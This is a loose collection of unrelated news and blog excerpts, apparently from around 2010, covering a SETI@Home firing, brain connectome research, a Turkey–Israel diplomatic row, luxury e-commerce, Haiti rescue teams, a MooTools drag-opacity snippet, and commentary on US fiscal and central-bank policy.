And Mother Jones will be on their side .

SETI@Home , one of the earlier and ( still ) largest distributed computing projects was launched more than 10 years ago , and it 's still pretty common for lots of folks ( geeks and non-geeks alike ) to run the screensavers and work through the mounds of SETI data .
That 's why it 's a bit surprising to find a News.com writeup by Chris Matyszczyk , about a guy fired for running the software written up as if SETI@Home were some sort of wacky new project by UFO enthusiasts .
Basically , it sounds like the guy installed the SETI@Home software on a bunch of computers at the school , and that upset school officials .
This is n't the first time we 've seen this sort of thing .
Five years ago , we wrote about a similar firing of an employee by the state of Ohio .
Still , if you look at the details of this particular firing the situation seems a lot different than the News.com report suggests ( or than even the article from AZCentral suggests ) .
There 's actually a criminal investigation going on , but the bigger issue ( even though it 's downplayed in the article ) is the fact that the school district claims the guy stole 18 computers from the district and had them in his home ( turned up by a warrant ) .
That seems a lot more understandable as an offense leading to termination .
Separately , it appears he did not complete his job duties -- such as installing firewall software that never showed up ( oddly , the article never actually defines the guy's job title , but it sounds like some sort of IT job ) .
The whole SETI@Home stuff just seems exaggerated .
This includes the claim , made in the article , that the guy 's actions cost the school district between $ 1.2 million and $ 1.6 million .
While some of this may be tied to the missing computers , the article implies that much of it is from running SETI@Home , which the school claims was a burden on the computer systems .
While he probably should n't have been running the software on those machines without permission , that alone is hardly that big of a deal .
It seems like most people at the school district and the writers of the articles linked above do n't understand how SETI@Home works , which seems to create an awful lot of confusion .

, a tiny worm about a millimeter long , does n’t have much of a brain , but it has a nervous system — one that comprises 302 nerve cells , or neurons , to be exact .
In the 1970s , a team of researchers at Cambridge University decided to create a complete “ wiring diagram ” of how each of those neurons are connected to one another .
Such wiring diagrams have recently been christened “ connectomes , ” drawing on their similarity to the genome , the total DNA sequence of an organism .
Theconnectome , reported in 1986 , took more than a dozen years of tedious labor to find .
Now a handful of researchers scattered across the globe are tackling a much more ambitious project : to find connectomes of brains more like our own .
The scientists , including several at MIT , are working on technologies needed to accelerate the slow and laborious process that theresearchers originally applied to worms .
With these technologies , they intend to map the connectomes of our animal cousins , and eventually perhaps even those of humans .
Their results could fundamentally alter our understanding of the brain .
Mapping the millions of miles of neuronal “ wires ” in the brain could help researchers understand how those neurons give rise to intelligence , personality and memory , says Sebastian Seung , professor of computational neuroscience at MIT .
For the past three years , Seung and his students have been building tools that they hope will allow researchers to unravel some of those connections .
To find connectomes , researchers will need to employ vast computing power to process images of the brain .
But first , they need to teach the computers what to look for .
Piecing together connectomes requires analyzing vast numbers of electron microscopic images of brain slices and tracing the tangled connections between neurons , each of which can send projections to other cells several inches away .
At the Max Planck Institute for Medical Research in Heidelberg , Germany , neuroscientists in the laboratory of Winfried Denk have assembled a team of several dozen people to manually trace connections between neurons in the retina .
It ’s a painstaking process — each neuron takes hours to trace , and each must be traced by as many as 10 people , in order to catch careless errors .
Using this manual approach , finding the connectome of just one cubic millimeter of brain would take tens of thousands of work - years , says Viren Jain , who recently completed his PhD in Seung ’s lab .
Jain and postdoctoral associate Srinivas Turaga want to speed up the process dramatically by enlisting the help of high - powered computers .
To do that , they are teaching the computers to analyze the brain slices , using a common computer science technique called automated machine learning , which allows computers to change their behavior in response to new data .
With machine learning , the researchers teach computers to learn by example .
They feed their computer electron micrographs as well as human tracings of these images .
The computer then searches for an algorithm that allows it to imitate human performance .
“ Instead of specifying the details of how the computer does something , you give it an example of what you want it to do and an algorithm that tries to figure out how to do what you want , ” says Jain .
After the computer is trained on the human tracings , it is applied to electron micrographs that have not been traced by humans .
This new technique represents the first time that computers have been effectively taught to segment any kind of images , not just neurons .
Jain and Turaga have also invented new ways of evaluating how well the computer imitates humans at the task of tracing .
Those measures are crucial for machine learning because the computer , just like students in a class , will not learn the desired task well unless the “ exam ” properly measures performance .
In their early efforts , it took the computer weeks or even months to come up with an accurate neuron - tracing algorithm .
However , Jain and Turaga cut that time dramatically when they started using computers equipped with graphics processing cards , allowing them to perform computations 50 to 100 times faster .
Now , it takes only days for their computer programs to produce a new tracing algorithm .
Their eventual goal is to use computers to process the bulk of the images needed to create connectomes , but they expect that humans will still need to proofread the computers ’ work .
Jain and Turaga have reported their advances at the International Conference on Computer Vision and the Neural Information Processing Systems Conference .
Olaf Sporns , a neuroscientist at the University of Indiana who first proposed diagramming the connectome in 2005 , says that he originally did not think it would be possible to create a map of individual connections between single neurons , and thought it would be best to focus on higher - level connections between brain regions .
“ Doing such a microscopic level of resolution seemed to be infeasible at the time , ” he says .
“ But now I ’m coming around to the idea that something like that may well be possible . ”
The machine learning technology that Seung and his students are developing could be “ a big leap forward ” in making that kind of diagram a reality , Sporns adds .
Last year , the National Institutes of Health announced a five - year , $ 30 million Human Connectome Project to develop new techniques to figure out the connectivity of the human brain .
That project is focused mainly on higher level , region - to - region connections .
Sporns says he believes that a good draft of higher - level connections could be achieved within the five - year timeline of the NIH project , and that significant progress will also be made toward a neuron - to - neuron map .
Some neuroscientists believe that mapping connectomes could have just as much impact as sequencing the human genome .
Much as genetic researchers can now compare individuals ’ genes to look for variability that might account for diseases , brain researchers could discover which differences in the wiring diagrams are important in diseases like Alzheimer ’s and schizophrenia , says Turaga .
Comparing connectomes as human development unfolds could also be informative , since much human behavior is learned , not encoded in the genome .
“ Compared to an adult , a baby does n’t know how to do very much .
The brain is slowly refined and becomes more powerful , and the thing that ’s refined is the wiring diagram , ” says Jain .
Many of the research teams that have begun working on neuron - to - neuron connectome diagrams are starting with small pieces of the whole .
These teams include a group at Harvard that ’s focusing on the human hippocampus , a brain region involved in memory and learning .
Other groups are starting with brain diagrams for smaller animals such as mice and zebrafish .
Though only a handful of labs around the world are working on the connectome right now , Jain and Turaga expect that to change as tools for diagramming the brain improve .
“ It ’s a common pattern in neuroscience : A few people will come up with new technology and pioneer some applications , and then everybody else will start to adopt it , ” says Jain .
Over 400 police officers and support staff were caught and disciplined for misuse of IT systems last year .
The real figure could be higher because some forces declined to provide information .
Apart from using work computers to access Facebook and smut sites , some officers and civilian workers were disciplined for inappropriate use of the police national computer .
In total 439 people were disciplined , according to documents obtained under the Freedom of Information Act by the Daily Mail .
South Yorkshire fared worst - 53 staff were disciplined , including three caught accessing police systems " without a legitimate police purpose " .
Some 47 forces provided information and on average each admitted to nine staff punished .
The Police Federation said it was surprised the figures were so high and suggested forces should be doing more to inform staff of what the rules were . ®
Nostalgia for the Ottomans Disillusioned with Europe , Turkey Looks East
As European opposition to EU membership for Turkey grows , Ankara is looking to forge closer ties to its neighbors .
Turkey wants to once again become a leading power in the Middle East -- but its relationship with Israel may suffer as a result .
One newspaper captioned the picture " the height of humiliation " [ Image : Lior Mizrahi / Israel Hayom ]
Turkey has demanded that Israel apologise over what it called the " discourteous " way its ambassador was treated during a diplomatic meeting .
Israel summoned Turkey 's ambassador to rebuke him over a TV series but ensured he was photographed on a lower chair .
In response , Turkey has summoned the Israeli ambassador to Ankara to express its " annoyance " .
The foreign ministry has also insisted it expects steps to be taken to compensate its envoy .
In a statement , the ministry said it awaited " an explanation and apology " for the " attitude " of Israel 's Deputy Foreign Minister Danny Ayalon .
" We invite the Israeli foreign ministry to respect the rules of diplomatic courtesy , " the statement said .
The television series that sparked the diplomatic row depicts Israeli intelligence agents as baby - snatchers .
' Repeated provocation ' Footage of Mr Ayalon urging journalists to make clear that the ambassador was seated on a low sofa , while the Israeli officials were in much higher chairs , has been widely broadcast by the Israeli media .
He is also heard pointing out in Hebrew that " there is only one flag here " and " we are not smiling " .
The Turkish flag had been removed from the table , leaving only the Israeli one .
In an interview with Israel 's Army Radio , Mr Ayalon was unapologetic .
" In terms of the diplomatic tactics available , this was the minimum that was warranted given the repeated provocation by political and other players in Turkey , " he said , according to Reuters .
One Israeli newspaper marked the height difference on the photo , and captioned it " the height of humiliation " .
The meeting with the Turkish ambassador , Ahmet Oguz Celikkol , was called over the fictional television series Valley of the Wolves , popular in Turkey .
It depicts Israeli intelligence operatives running operations to kidnap babies and convert them to Judaism .
Last October Israel complained over another Turkish series , which depicted Israeli soldiers killing Palestinians .
In one clip , an Israeli soldier shoots dead a smiling young girl at close range .
The row comes ahead of a planned visit by Israeli Defence Minister Ehud Barak to Turkey on Sunday .
Turkey has long been an ally of Israel , but relations have deteriorated as Ankara has repeatedly criticised Israel for its offensive in Gaza a year ago .
Rights groups say about 1,400 Palestinians died during the operation , which Israel said was aimed at ending rocket fire by Hamas .

The Doctor knows that River Song is a part of his future .
Their lives are becoming inextricably intertwined , but in these early days – for the Doctor at least – they must navigate their relationship without too many spoilers ...
Angling for a share of the higher - margin luxury goods market , several online companies have set up shop to undercut traditional retail competition in this culturally cacheted space .
The fat margins on the opulence offered by such companies as Coach ( NYSE : COH ) , Tiffany ( NYSE : TIF ) , and Luxottica were bound to attract competitors willing to slash prices in order to horn in on big - name luxury retailers .
This new breed of companies involves web - based , members - only outlets that promise huge discounts off retail prices ( as high as 75 % , and most around 60 % ) for designer merchandise .
Already , they 've grown surprisingly large .
Gilt , the first entrant to the space in 2007 , now boasts 2 million members .
Other companies include HauteLook and Rue La La , the latter of which is owned by GSI Commerce ( NASDAQ : GSIC ) .
The trend is problematic enough that Saks ( NYSE : SKS ) is brewing up its own version .
The sites sell high - end clothing for men , women , and children , as well as offering jewelry , watches , and other upscale household gewgaws .
As investors in Blue Nile ( NASDAQ : NILE ) know , higher - end web - based sales can be tremendously lucrative , even if they undercut competitors .
Blue Nile has the gaudy numbers you might expect : a 40 % return on capital in the last four quarters .
And recession ?
What recession ?
Gilt CEO Susan
Lyne echoes that sentiment : " I joined Gilt because it was hypergrowth .
The model works no matter what . "
The company cuts deals with 650 brands and expects $ 400 million in sales for fiscal 2009 , way outdistancing the publicly held Blue Nile 's $ 285 million in trailing revenue .
Exclusivity and snob appeal are the major attractions of the luxury market .
To preserve these advantages online , Gilt and similar companies limit their sales on select merchandise to just 36 hours .
Some highly desired items are gone in minutes .
When the sale ends , members must look to the next round of offerings by other designers , a novelty that keeps customers coming back to shop .
And exclusivity is further promoted by long delivery times ; in many cases , customers receive their merchandise directly from the designers , another sign that consumers " have arrived . "
Even Gilt 's name plays on shoppers ' willingness to feel guilty and decadent about luxury consumption .
The irony and the ecstasy
Yet for all the promotion of exclusivity , there 's something of a bait - and - switch going on .
In effect , these companies are transforming the notion of product exclusivity , which had been established largely through high price , to a model in which exclusivity is created by the appeal of finding that cheap treasure .
In short , it 's more about triumphantly snatching up a great deal " that wo n't last " than shelling out a pile of greenbacks for it .
Another problem for contenders such as Gilt is the Veblen effect , which posits that a good 's value to consumers goes up as its price goes up .
Get that ?
For a certain class of consumer , higher price means more value .
That 's why chains such as Saks have some breathing room from these upstarts .
Some people will always derive more value by paying a higher price .
The central irony of luxury products has always been the problem of creating exclusivity in a market - based world that must grow profit ceaselessly .
Although these web - only companies sell themselves as exclusive , by allegedly restricting entry to those invited by current members , access can be readily and easily obtained .
Luxury must always feel exclusive , even if true success lies in expanding markets .
As the hunt for survivors continues amid the rubble of Port - au - Prince , five fully equipped search - and - rescue teams specially trained to rescue people from collapsed buildings in the aftermath of an earthquake , remain grounded in Canada .
The country 's Heavy Urban Search and Rescue ( HUSAR ) teams - located in Toronto , Vancouver , Calgary , Halifax and Manitoba , are all waiting patiently for the call to help in Haiti .
But so far no call has come .
" We have a membership that lives and breathes this type of scenario .
We are itching to go , " Coby Duerr , the leader of Calgary 's unit , told the Calgary Herald .
" It is what we do . "
Attempts to reach the head of Toronto 's unit , Doug Silver , were unsuccessful .
The country 's HUSAR teams are made up of firefighters , paramedics and police officers , who volunteer for the specialized training and are ready to be deployed in a matter of hours in case of emergency both at home and abroad .
" HUSAR teams locate trapped persons in collapsed structures and other entrapments using specially trained dogs and electronic search equipment , " states Public Safety Canada 's website .
" The teams breach , shore , lift and remove structural components , use heavy construction equipment to remove debris , and medically treat and transfer victims .
Several countries , including the U.S. , the Netherlands , Poland , Ecuador and Russia , have already sent their search - and - rescue teams and structural collapse specialists .
Toronto Mayor David Miller said the city has advised the federal government that Toronto 's HUSAR team stands " ready to assist " if required .
Public Safety Canada runs the HUSAR program , but a spokesman for the agency said Foreign Affairs makes the decision on whether or not a unit will be sent abroad .
Foreign Affairs says they have offered Toronto 's HUSAR team and other specially trained personnel to the United Nations ' coordinated relief mission in Haiti .
" They will let Canada know when those services are required , " said Lisa Monette , a spokeswoman for the department .
There is limited capacity at the airport in Port - au - Prince , Monette said , and the UN must prioritize its resources .
" We need them to tell us that this is a priority .
The offer has been made on behalf of Canada . "
But with each day , the search - and - rescue team 's usefulness decreases .
Sunday will be five days since the earthquake , at which time the survival rate for those rescued drops to 7 per cent .
" We are starting to shift from urgent search and rescue to humanitarian response and stabilization efforts , " Foreign Affairs Minister Lawrence Cannon told reporters Saturday morning .

Monette said the cost of transporting a HUSAR team - and their specialized equipment - is not the reason they have n't been deployed .
" If the request is made , then the decision will be made in terms of who would go , " she said , adding that several police departments in Canada have also offered to send officers to the mission .
Former BB guestblogger Douglas Rushkoff and PBS produccer Rachel Dretzin have created a documentary called Digital Nation .
PBS has added some learning resources along with the standard mini-movies with titles like " Getting Ready for Robots . "
Viewable Feb. 1 online , Feb. 2 on Frontline at 9 pm .
Dretzin and Rushkoff begin on the campus of the Massachusetts Institute of Technology , home to some of the most technologically savvy students in the world .
Many of these " digital natives , " who have hardly known a world in which they were n't connected 24/7 , confess to having increasingly limited attention spans that make it difficult for them to read books or learn in conventional ways .
" Honestly , I can't sit somewhere for two hours straight and focus on anything , " says a student named Alex .
" Maybe it 's some technology dependence I 've developed over the course of the years , but at this point I do n't think I can go back to just focusing on one thing . "
Hot Effect : MooTools Drag Opacity
As you should already know , the best visual features of a website are usually held within the most subtle of details .
One simple trick that usually makes a big different is the use of opacity and fading .
Another awesome MooTools functionality is dragging .
Why not double the awesomeness of Element dragging by adding fading ?
The MooTools JavaScript
window.addEvent ( ' domready ' , function ( ) { var z = 2 ; $ $ ( '.draggable ' ) .each( function ( el ) { var drag = new Drag .
Move ( el , { grid : false , preventDefault : true , onStart : function ( ) { el.setStyle ( 'z - index ' , z++).fade ( 0.5 ) ; } , onComplete : function ( ) { el.fade ( 1 ) ; } } ) ; } ) ; } ) ;
The code itself is quite simple -- we use Drag .
Move 's onStart and onComplete events to begin and end the fading .
We 've chosen to fade to the desired opacity level over a given duration because a subtle fade is a bit less drastic .
We could simply use set ( ' opacity ' , '0.5 ' ) if we wanted an immediate fade .
I consider the above effect a " cheap " way to increase the coolness of element dragging .
Very little overhead and just another effect to take your website to the next level !

A day later , the war rages on the kill tally is , quite literally , in the millions , and the forums are alive with the sounds of people having good , friendly fun while hurling bitter , teary - eyed recrimination at one another .
You 'll be happy to know the Demo / Soldier War has even taken hold inside the Valve offices .

As of this point , I ’m not voting for the bill .

I ’m going to do my best to make this bill a better bill , a bill that I can vote for , but I ’ve indicated both to the White House and the Democratic leadership that my vote is not secure at this point .
And here is the reason .
When the public option was withdrawn , because of Lieberman ’s action , what I worry about is how do you control escalating health care costs ?
This is a big deal .
Bernie Sanders has got to be facing incredible pressure , the likes of which Joe Lieberman or Ben Nelson have never seen .
If he manages to hold firm to his position and improve this bill , he 'll have shown that you can't always count on the left to cave to the right .

Video : Avalanche airbag
AVALANCHES are n’t exactly stealthy , but they can still catch intrepid skiers unaware .
Thanks to a networked airbag system , though , friends will now be able to come to the rescue .
Avalanche airbag systems ( ABS ) have become a common piece of kit for off - piste skiers .
The two airbags , stowed in a backpack , inflate at the pull of a cord , adding volume to the skier and increasing their chances of staying close to the surface during an avalanche .
The trouble is that some skiers fail to deploy their ABS , says Bernhard Budaker of the Fraunhofer Institute for Manufacturing Engineering and …
Lt. Angelo Andriani of the Hoboken Police Department , who is currently on a two - year paid suspension from the force following the 2007 SWAT team scandal in Hoboken , caused a disturbance at Tampa International Airport in Florida on Jan. 18 , police reported .
According to a Tampa police log , two TIA police officers responded to a disturbance call at 9:15 a.m. when Andriani , 56 , who was in line for a flight to New Jersey , became irate when airline flight crew members were permitted to pass him in line at a Transportation Security Administration checkpoint .
He took pictures of TSA agents ' badges , police said .
Ann Davis , TSA spokeswoman , said the passenger yelled at TSA officers , complained about the screening process , displayed a badge and said he was a police officer .
Airport police ran a wanted check on him before allowing him to continue to his flight , the police log said .
Hoboken Police Chief Anthony Falco said that , since this relates to an internal investigation within the police department , he is required by attorney general guidelines not to comment .
Falco said he does not know Andriani 's current residence .
It has been previously reported that Andriani is paid $ 11,000 a month while on suspension .
Andriani ’s suspension is the longest in the history of the Hoboken Police Department .
Related story : Mayor Zimmer calls for suspension of Andriani's pay
Andriani could not be immediately reached for comment .
The 2007 SWAT team scandal resulted in former Chief of Police Carmen LaBruno 's resignation and a lawsuit against Andriani by five Hispanic Hoboken police officers who called him an " unabashed white supremacist . "
Andriani and other members of the city 's SWAT team had gone on a supposed mission of mercy to help survivors of Hurricane Katrina .
Photos and videos , though , showed them in police - issued gear posing with bare - breasted women at Mardi Gras in New Orleans , letting Hooters girls hold their weapons in Alabama and downing Jello shots in a Louisiana bar .
They also show him posing in a Confederate cap and pretending to be a Ku Klux Klan member at a restaurant .
Video shows Andriani passing a handgun and bullets around at a party .
UPDATE II :
It seems that it is not a freeze in non-security discretionary outlays , but rather an overall cap on non-security discretionary -- which is a diffrent animal .
And it seems that it is not an overall cap on non-security discretionary outlays , but instead an overall cap on non-security discretionary authority -- which is a different animal .
And it seems that it is not a binding cap on overall non-security discretionary : that ARRA extensions and other job - boosting deficit - spending measures , plus other " emergencies " , are exempt ...
UPDATE
An administration source says that he believes that discretionary non-security is not frozen at 2010 ex-stimulus levels for 2011 , but is instead bumped up from 2010 to 2011 -- that the freeze part applies to fiscal 2012 , 2013 , and 2014 .
For some time I have been worried about fifty little Herbert Hoovers at the state level .
Right now it looks like I have to worry about one big one :
Jackie Calmes : Obama to Propose Freeze on Some Spending to Trim Deficit : President Obama will call for a three - year freeze in spending on many domestic programs , and for increases no greater than inflation after that , an initiative intended to signal his seriousness about cutting the budget deficit , administration officials said Monday .
The officials said the proposal would be a major component both of Mr. Obama ’s State of the Union address on Wednesday and of the budget he will send to Congress on Monday for the fiscal year that begins in October .
The freeze would cover the agencies and programs for which Congress allocates specific budgets each year , from air traffic control and farm subsidies to education , nutrition and national parks .
ut it would exempt the budgets for the Pentagon ....
The estimated $ 250 billion in savings over 10 years would be less than 3 percent of the roughly $ 9 trillion in additional debt the government is expected to accumulate over that time ...
There are two ways to look at this .
The first is that this is simply another game of Dingbat Kabuki .
Non-security discretionary spending is some $ 500 billion a year .
It ought to be growing at 5 % per year in nominal terms ( more because we are in a deep recession and should be pulling discretionary spending forward from the future as fast as we can ) -- that 's only $ 25 billion a year in a $ 3 trillion budget and a $ 15 trillion economy .
But in a country as big as this one even this is large stakes .
What we are talking about is $ 25 billion of fiscal drag in 2011 , $ 50 billion in 2012 , and $ 75 billion in 2013 .
By 2013 things will hopefully be better enough that the Federal Reserve will be raising interest rates and will be able to offset the damage to employment and output .
But in 2011 GDP will be lower by $ 35 billion -- employment lower by 350,000 or so -- and in 2012 GDP will be lower by $ 70 billion -- employment lower by 700,000 or so -- than it would have been had non-defense discretionary grown at its normal rate .
( And if you think , as I do , that the federal government really ought to be filling state budget deficit gaps over the next two years to the tune of $ 200 billion per year ... )
And what do we get for these larger output gaps and higher unemployment rates in 2011 and 2012 ?
Obama " signal[s ] his seriousness about cutting the budget deficit , " Jackie Calmes reports .
As one deficit - hawk journalist of my acquaintance says this evening , this is a perfect example of fundamental unseriousness : rather than make proposals that will actually tackle the long - term deficit -- either through future tax increases triggered by excessive deficits or through future entitlement spending caps triggered by excessive deficits -- come up with a proposal that does short - term harm to the economy without tackling the deficit in any serious and significant way .
As Jackie Calmes writes , this is n't a real plan to control the deficit but a " symbolic " one :
[ O ] ne administration official said that limiting the much smaller discretionary domestic budget would have larger symbolic value .
That spending includes lawmakers ’ earmarks for parochial projects , and only when the public believes such perceived waste is being wrung out will they be willing to consider reductions in popular entitlement programs , the official said .
“ By helping to create a new atmosphere of fiscal discipline , it can actually also feed into debates over other components of the budget , ” the official said , briefing reporters on the condition of anonymity .
As another deficit - hawk points out : it would be one thing to offer a short - term discretionary spending freeze ( or long - run entitlement caps ) in return for fifteen Republican senators signing on to revenue enhancement triggers .
It 's quite another to negotiate against yourself and in addition attack employment in the short term .
The fact that the unemployment rate is projected to remain stable over the next year means that there is a 30 % chance it will go down , a 40 % chance it will stay about the same , and a 30 % chance that it will go up -- and whatever it turns out to do , the administration 's budget has just given it an extra bump upwards .

Obama ’s Self - Inflicted Lobotomy Proceeds Apace « The Reality - Based Community : I ’m trying to think of what could possibly be a worse plan .
Let ’s see : we might be entering a double - dip recession and unemployment is in double - digits , and you are going to freeze spending ?
What in God ’s name are they thinking ?
Perhaps the worst thing about this is how it cedes the ideological ground to the Republicans .
At some point someone must make an argument for government .
I think it was former Senator Paul Simon who said : “ give the voters a choice between a Republican and a Republican and they will choose a Republican every time . ”
What next ?
The rotting corpse of Andrew Mellon as Treasury Secretary ?
Or do we already have that ?

We apologize in advance for the NY Magazine - style headline , but this is a report that has to be read by all Senators who are preparing to reconfirm Bernanke for a second term .
When voting for the Chairman , be aware that all of America will now look at you as the perpetrators who are encouraging the greatest inter and intra-generational theft to continue , and as prescribed by Newton 3rd law , sooner or later , an appropriate reaction will come from the very same middle class that you are seeking to doom into a state of perpetual penury and a declining standard of living .
America spoke in Massachusetts , and will speak again very soon if you do not send the appropriate signal that you have heard its anger - Do Not Reconfirm Bernanke .
You have been warned .
We present Albert Edwards ' latest in its complete form as it must be read by all unabridged and without commentary .
These are not the deranged ramblings of a fringe blogger - this is a chief strategist for a major international bank .
Theft !
Were the US & UK central banks complicit in robbing the middle classes ?
by Albert Edwards , Societe Generale
Mr Bernanke ’s in - house Fed economists have found that the Fed was n’t responsible for the boom which subsequently turned into the biggest bust since the 1930s .
Are those the same Fed staffers whose research led Mr Bernanke to assert in Oct. 2005 that “ there was no housing bubble to go bust ” ?
The reasons for the US and the UK central banks inflating the bubble range from incompetence and negligence to just plain spinelessness .
Let me propose an alternative thesis .
Did the US and UK central banks collude with the politicians to ‘ steal ’ their nations ’ income growth from the middle classes and hand it to the very rich ?
Ben Bernanke ?s recent speech at the American Economic Association made me feel sick .
Like Alan Greenspan , he is still in denial .
The pigmies that populate the political and monetary elites prefer to genuflect to the court of public opinion in a pathetic attempt to deflect blame from their own gross and unforgivable incompetence .
The US and UK have seen a huge rise in inequality over the last two decades , as growth in national income has been diverted almost exclusively to the top income earners ( see chart below ) .
The middle classes have seen median real incomes stagnate over that period and , as a consequence , corporate margins and profits have boomed .
Some recent reading has got me thinking as to whether the US and UK central banks were actively complicit in an aggressive re-distributive policy benefiting the very rich .
Indeed , it has been amazing how little political backlash there has been against the stagnation of ordinary people ?s earnings in the US and UK .
Did central banks , in creating housing bubbles , help distract middle class attention from this re-distributive policy by allowing them to keep consuming via equity extraction ?
The emergence of extreme inequality might never otherwise have been tolerated by the electorate ( see chart below ) .
And now the bubbles have burst , along with central banks ?
credibility , what now ?
After reading Ben Bernanke ?s speech , once again denying culpability for the bubble , I really didn?t know whether to laugh or cry ( remember that Ben Bernanke , like Tim Geithner , was a key member of the Greenspan Fed ) .
I feel like Peter Finch in the film Network , sticking my head out of the window and shouting " I 'm as mad as hell and I 'm not going to take it anymore ! "
Although criticism of the Fed ( and the Bank of England ) has now become louder and more widespread , I feel my longstanding derision for their actions during the so - called ?
good years ?
puts me in a stronger position than some to offer further comment .
Opening my 2002 - 2005 file of old weeklies I did not have to go any further than the first paragraph of the top copy ( end of December 2005 ) .
“ As far as Alan Greenspan ’s tenure at the Fed is concerned , we have spared few words of derision .
We have made plain our views that the supposed US prosperity that has accompanied his tenure has been based on a grotesque mountain of debt .
We have likened the economy to a Ponzi scheme which will ultimately collapse .
He has allowed the funding of strong economic activity by mortgaging the US ’s future against one bubble ( equity ) and then another ( housing ) , which is now beginning to implode ” .
These are almost consensus thoughts now , but not then .
The pigmies that populate the political and monetary elites prefer to genuflect to the court of public opinion .
Blaming the banks is simply a pathetic attempt to deflect the public fury from their own gross and unforgivable incompetence .
We have stated before that banks are not the primary cause of the bust .
Just as in Japan , a decade earlier , bank problems are a symptom of the bust .
It is the monetary and regulatory authorities that are responsible for this mess .
And it is not just obvious in retrospect .
It was perfectly obvious from the beginning .
I was shocked by a recent survey of Wall Street and business economists , published in the Wall Street Journal ( see Bernanke View Doubted 14 Jan ? link ) .
Asked whether they agreed or disagreed with the proposition ‘ excessively easy Fed policy in the first half of the decade helped cause a bubble in house prices ’ , some 42 , or 74 % agreed with the proposition .
So unbelievably there are still 12 economists surveyed who did not agree !
Even more incredible , a majority of academic economists did not agree with the proposition .
Maybe they have sympathy for a fellow academic or maybe they actually believe the preposterous proposition that the western central banks were not in control of the bubbles which were primarily due to tidal waves of surplus savings washing across from Asia .
John Taylor shows this to be nonsense .
There was no global savings glut ( see chart below )
John Taylor is well known for his famous ?
Taylor Rule ? for the appropriate level of interest rates and he has been very vocal in his criticism of Fed laxity in the aftermath of the Nasdaq crash in his paper ?
The Financial Crisis and Policy Responses : An Empirical Analysis of What Went Wrong ’ , Nov. 2008 and elsewhere - link .
His thesis is simple .
Lax monetary policy caused the boom in housing upon which euphoric credit excesses were built .
The subsequent bust was an inevitable mirror image of the boom .
This simply would not have occurred had the Fed ( and the Bank of England ) acted earlier to tighten policy as shown in the Taylor ?s counterfactual profiles ( see charts below ) .
More recently , the San Francisco Fed published a paper this month showing that those countries which saw the steepest run-up in house prices over the last decade also saw the largest rise in household sector leverage ( see charts below and link ) .
Of course the causality runs both ways .
Loose monetary policy generates higher borrowing which pushes up house prices .
Subsequently this prompts other households to borrow against the rising value of their houses to finance consumption via net equity extraction .
Generally most commentators have fallen for the populist line that the banks are to blame .
Very rarely does a leading commentator pin the blame where it deserves to be ? on the central banks .
Hence , I was very interested to read the Financial Times Insight column on Tuesday from the deep - thinking columnist , John Plender ( interestingly his title in the print edition was “ Blame the central bankers more than the private bankers ” was changed to “ Remove the punchbowl before the party gets rowdy ” in the web edition - link ) .
Plender ?s point is classic Minsky .
An unusually long period of economic stability , also known as The Great Moderation , engineered by Central Bank laxity inevitably created the conditions for the subsequent bust .
“ Central banks clearly bear much responsibility for past excessive credit expansion .
The Fed ’s gradualist and transparent approach to raising rates in middecade also ensured that bankers were never shocked into a recognition that unprecedented shrinkage of bank equity was phenomenally dangerous .
Despite the popular perception that financial innovation caused so much of the damage in the crisis , the rise in bank leverage was a far more important factor ” .
His point that it takes guts to remove the punch - bowl when the party is in full swing is spot on .
The Fed and the Bank of England were both gutless and spineless .
Their love affair with The Great Moderation meant they simply were not prepared to tolerate a little more pain now to avoid a Minsky credit bust and massive unemployment later .
But what is the relationship , if any , between this extreme central bank laxity in the US and UK and these countries being at the forefront for the extraordinary rise in inequality over the last few decades ( see cover chart ) ?
And does it matter ?
I was reading some typically thought - provoking comments from Marc Faber in his Gloom , Boom and Doom report about current extremes of inequality .
It reminded me that our own excellent US economists Steven Gallagher and Aneta Markowska had also written on this .
To be sure , the rise in inequality has been staggering in the US in recent years ( see charts below ) .
It is well worth visiting the website of Emmanuel Saez of the University of California who has written extensively on this subject and now has updated his charts up until the end of 2008 ( data available in Excel Format ? link ) .
The New York Times reported on the recently released Census Bureau data and showed not only that median income had declined over the last 10 years in real terms , but that this is the first full decade that real median household income has failed to rise in the US - link .
What is also so interesting from Professor Saez ?s cross-sectional research is how inequality has clearly risen fastest in the Anglosaxon , freemarket economies of the US and the UK ( also note that France , with much higher levels of equality , saw much more subdued growth in household leverage ) .
Our US economists make the very interesting point ( similar to Marc Faber ) that peaks of income skewness ?
1929 and 2007 ?
tell us there is something fundamentally unsustainable about excessively uneven income distribution .
With a relatively low marginal propensity to consume among the rich , when they receive the vast bulk of income growth , as they have , then the country will face an under - consumption problem ( see 9 September The Economic News ?- link .
Marc Faber also cites John Hobson ?s work on this same topic from the 1930s ) .
Hence , while governments preside over economic policies which make the very rich even richer , national consumption needs to be boosted in some way to avoid underconsumption ending in outright deflation .
In addition , the middle classes also need to be thrown a sop to disguise the fact they are not benefiting at all from economic growth .
This is where central banks have played their pernicious part .
I recalled seeing another article from John Plender on this topic back in April 2008 .
His explanation for why there had been so little backlash from the stagnation of ordinary people ?s income at a time when the rich did so well was simple : ?
" Rising asset prices , especially in the housing market , created a sense of increasing wealth regardless of income .
Remortgaging homes over a long period of declining interest rates provided a convenient source of funds via equity withdrawal to finance increased consumption ” – link .
Now you might argue central banks had no alternative in the face of under - consumption .
Or you might conclude there was a deliberate , unspoken collusion among policymakers to ?rob ?
the middle classes of their rightful share of income growth by throwing them illusionary spending power based on asset price inflation .
We will never know .
But it is clear in my mind that ordinary working people would not have tolerated these extreme redistributive policies had not the UK and US central banks played their supporting role .
Going forward , in the absence of a sustained housing boom , labour will fight back to take its proper ( normal ) share of the national cake , squeezing profits on a secular basis .
For as Bill Gross pointed out back in PIMCO ?s investment outlook ?
Enough is Enough ’ of August 1997 , " ?
When the fruits of society ’s labor become maldistributed , when the rich get richer and the middle and lower classes struggle to keep their heads above water as is clearly the case today , then the system ultimately breaks down . ”- link .
In Japan , low levels of inequality and inherent social cohesion prevented a social breakdown in this post - bubble debacle .
With social inequality currently so very high in the US and the UK , it doesn?t take much to conclude that extreme inequality could strain the fabric of society far closer to breaking point .
That 's why I am instructing my Administration to get to work immediately with Congress on this issue .
We are going to talk with bipartisan Congressional leaders to develop a forceful response to this decision . "
Just so we 're clear here - he 's condemning the decision in no uncertain terms and pledging to develop a response that deals legislatively with their ruling .
The reason we need to be so clear is because this morning there were a number of typically snarky comments by some of the most " prominent " bloggers on this site slamming the President for not saying anything about the ruling ( I think at the time the ruling had been out for a few minutes ) .
We can all look forward to their mea culpas .
And you know who you are .
